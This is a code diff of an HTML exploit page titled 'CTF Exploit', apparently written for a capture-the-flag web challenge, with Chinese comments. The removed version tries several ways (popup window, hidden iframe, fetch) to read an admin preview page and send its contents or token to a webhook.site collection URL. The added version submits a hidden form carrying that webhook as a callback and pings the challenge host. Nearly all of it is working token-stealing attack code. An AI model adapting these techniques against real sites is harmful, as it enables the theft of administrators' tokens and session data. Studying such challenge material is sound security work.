@@ -4,49 +4,21 @@
   <title>CTF Exploit</title>
 </head>
 <body>
-  <h1>Extracting token...</h1>
+  <h1>Extracting admin token...</h1>
   
-  <!-- 方法1: 使用 window.open -->
+  <!-- 隐藏表单，用于重定向 -->
+  <form id="redirect-form" action="http://fnxek7pz6fqgwxn9a8lb214iuqlpd2.simpletasks.web.jctf.pro/tasks/preview/0/0" method="GET" style="display:none;">
+    <input type="hidden" name="callback" value="https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98">
+  </form>
+  
   <script>
-    // 打開 admin 的 preview 頁面
-    var adminWindow = window.open('http://localhost:3000/tasks/preview/0/0', 'admin');
+    // 通知webhook bot已访问
+    fetch('http://fnxek7pz6fqgwxn9a8lb214iuqlpd2.simpletasks.web.jctf.pro?status=bot_here').catch(() => {});
     
-    // 嘗試讀取內容（可能被阻擋）
+    // 1秒后提交表单，重定向到admin preview页面
     setTimeout(() => {
-      try {
-        var content = adminWindow.document.body.innerText;
-        window.location = 'https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?token=' + encodeURIComponent(content);
-      } catch(e) {
-        // 如果失敗，使用 postMessage
-        adminWindow.postMessage('getToken', '*');
-      }
+      document.getElementById('redirect-form').submit();
     }, 1000);
-    
-    // 監聽可能的回應
-    window.addEventListener('message', (e) => {
-      window.location = 'https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?data=' + encodeURIComponent(e.data);
-    });
-  </script>
-  
-  <!-- 方法2: 使用隱藏的 iframe -->
-  <iframe src="http://localhost:3000/tasks/preview/0/0" style="display:none" id="target"></iframe>
-  
-  <script>
-    document.getElementById('target').onload = function() {
-      // 嘗試多種方式提取內容
-      setTimeout(() => {
-        // 使用 XHR 請求
-        fetch('http://localhost:3000/tasks/preview/0/0')
-          .then(r => r.text())
-          .then(data => {
-            window.location = 'https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?xhr=' + encodeURIComponent(data);
-          })
-          .catch(e => {
-            // 如果 XHR 失敗，嘗試其他方法
-            window.location = 'https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?error=xhr_failed';
-          });
-      }, 500);
-    };
   </script>
 </body>
 </html>
